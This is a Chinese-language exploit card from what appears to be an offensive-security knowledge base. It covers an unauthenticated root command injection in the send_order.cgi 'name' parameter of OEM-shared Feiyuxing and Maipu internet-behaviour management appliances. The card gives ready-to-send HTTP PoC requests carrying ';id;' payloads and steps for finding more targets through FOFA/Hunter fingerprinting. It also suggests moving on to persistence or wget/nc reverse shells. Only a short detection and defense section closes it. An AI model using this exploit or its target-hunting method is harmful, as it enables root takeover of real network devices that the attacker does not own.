---
id: iot-oem-same-fingerprint-send-order-cgi-command-injection
title: OEM 同源设备漏洞迁移：飞鱼星/迈普 send_order.cgi name 参数命令注入（uid=0）
type: scenario
domain: iot
path: iot
technique: iot-oem-reuse-send-order-cgi-name-command-injection
aliases:
- 飞鱼星 send_order.cgi 命令注入
- 迈普 send_order.cgi 命令注入
- OEM 同源设备漏洞迁移
- send_order.cgi parameter=operation
- 上网行为管理设备命令注入
tags:
- iot
- router
- oem
- firmware
- command-injection
- cgi
- feiyuxing
- maipu
- asset-fingerprint
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V335
  verified_at: '2026-11-08T18:59:11+08:00'
  notes: 已对照原文与24/24图片核对：img19 飞鱼星 send_order.cgi 以 ;id; 返回 uid=0，img21 第二目标以 ;id;echo Hello World!; 回显，与 PoC 一致；img21 主机名被截断，迈普归属据原文配图顺序。原文未声明受影响版本，affected_versions 已 --clear；PoC 未携带 Cookie，按原文视为未授权。修正 PoC Content-Length 为实际字节数 40/58。未验证点：权限绕过/cookie.cgi 细节原文未展开，未写入本卡；PoC 未执行。dedup 为本卡自匹配，dup-scan 无本卡 pair；无 sources/文章ID/URL/长段摘录；path iot 合法。
---

## 一句话结论

飞鱼星企业级智能上网行为管理系统与迈普多业务融合系统使用同一 OEM 代码，前端静态资源（JS/CSS/登录页）可直接识别同源；飞鱼星上已验证的 `/send_order.cgi?parameter=operation` 接口把 JSON 里的 `name` 直接拼进 shell，迁移到迈普后 POST `{"opid":"1","name":";id;","type":"rest"}` 同样返回 `uid=0(root)`，即未授权 root 命令执行。

## 原理

- **OEM 同源判定**：设备 Web 管理界面通常由 OEM 提供整套前端和 CGI。不同品牌但同 OEM 的设备会复用相同的静态资源路径、JS 文件名、登录页结构和 CGI 接口命名；通过在已知漏洞设备上提取前端特征值（静态文件路径/文件名/内容哈希），再到 FOFA/Hunter 用这些特征搜索，可找出其他品牌的同源机型。
- **漏洞迁移**：同一 OEM 的 CGI 二进制/脚本通常相同或高度相似，已知漏洞的接口与参数在原厂设备上大概率仍然存在；只需替换 Host 重放 PoC，即可验证。
- **send_order.cgi 注入**：`/send_order.cgi?parameter=operation` 接收 JSON（`opid`、`name`、`type`），其中 `name` 被拼入后端命令（疑似 `system()` 调用）且未过滤 `;`、`|`、`` ` `` 等元字符。原文在飞鱼星与迈普上分别提交 `{"opid":"1","name":";id;","type":"rest"}`，响应体返回 `uid=0(root) gid=0(root)`；迈普上追加 `;echo Hello World!;` 也回显，证明命令以 root 执行。
- 为什么成立：OEM 复用导致代码级同源，漏洞不随品牌更换而消失；CGI 参数进入 shell 时未做转义，分号即可串联任意命令。

## 触发条件

- 目标为飞鱼星企业级智能上网行为管理系统或迈普多业务融合系统（或其它使用同一 OEM 的机型）。
- `/send_order.cgi?parameter=operation` 可访问；原文 PoC 未携带登录 Cookie，响应即返回 root 命令结果，按原文视为未授权可达（若目标有前置认证需另行确认）。
- 后端 `name` 参数进入 shell 且未过滤命令分隔符。

## 利用步骤

1. 在已知漏洞设备（如飞鱼星）上收集前端特征值：登录页、`/js/`、`/css/` 下的文件名/路径、静态资源哈希等。
2. 用 FOFA/Hunter 搜索相同特征，筛出其他品牌/型号（本例迈普多业务融合系统），确认页面结构与静态资源一致。
3. 在同一路径重放已知 PoC：先验证 `;id;`，再追加 `;echo Hello World!;` 等命令确认回显。
4. 若返回 `uid=0(root)`，说明命令注入成立且为 root；可进一步写入持久化/反弹 shell。
5. 拉取该设备固件做白盒审计，扩大同 OEM 机型与其它 CGI 的攻击面。

## PoC

```http
POST /send_order.cgi?parameter=operation HTTP/1.1
Host: <target>
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 40

{"opid":"1","name":";id;","type":"rest"}
```

```http
# 迈普多业务融合系统上追加命令
POST /send_order.cgi?parameter=operation HTTP/1.1
Host: <maipu-target>
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 58

{"opid":"1","name":";id;echo Hello World!;","type":"rest"}
```

响应示例：`uid=0(root) gid=0(root)` + `Hello World!` + `{"type":1,"msg":"ok"}`。说明：PoC 为原文实测复现，未在本机执行；换行/长度按实际 HTTP 客户端调整。

## 变体与关联

- 变体（OEM 识别）：静态资源 hash、favicon hash、登录页 HTML 结构、JS 变量名、CGI 路径均可作为同源指纹；也可用 FOFA `body=`/`icon_hash=` 组合。
- 变体（注入载荷）：`;id;`、`;echo ...;`、反引号、`|`；可替换为 `wget`/`nc` 反弹 shell。
- 关联：[[iot-dlink-wayos-usb-paswd-hname-command-injection]]（另一 OEM 复用的路由器命令注入）、[[web-java-component-yonyou-u8oa-operafileactioncontroller-arbitrary-file-overwrite]]（同类组件复用思路在 Web 产品的体现）。
- 边界：接口被认证/WAF 保护、后端已转义 `name`、或 OEM 定制分支修复该漏洞时失效；仅凭前端相似不能证明同一二进制，需重放验证。

## 检测与防御

- 检测特征：`send_order.cgi?parameter=operation` 请求体 `name` 含 `;`/`|`/反引号/`$(`；响应中出现 `uid=0` 或异常命令输出；Web 进程派生 `id`/`sh` 等子进程。
- 防御：对 `name` 做严格白名单并转义 shell 元字符；避免字符串拼接 shell；管理接口加认证与访问控制；升级 OEM 修复固件；用前端指纹做资产测绘时同步排查同源机型。
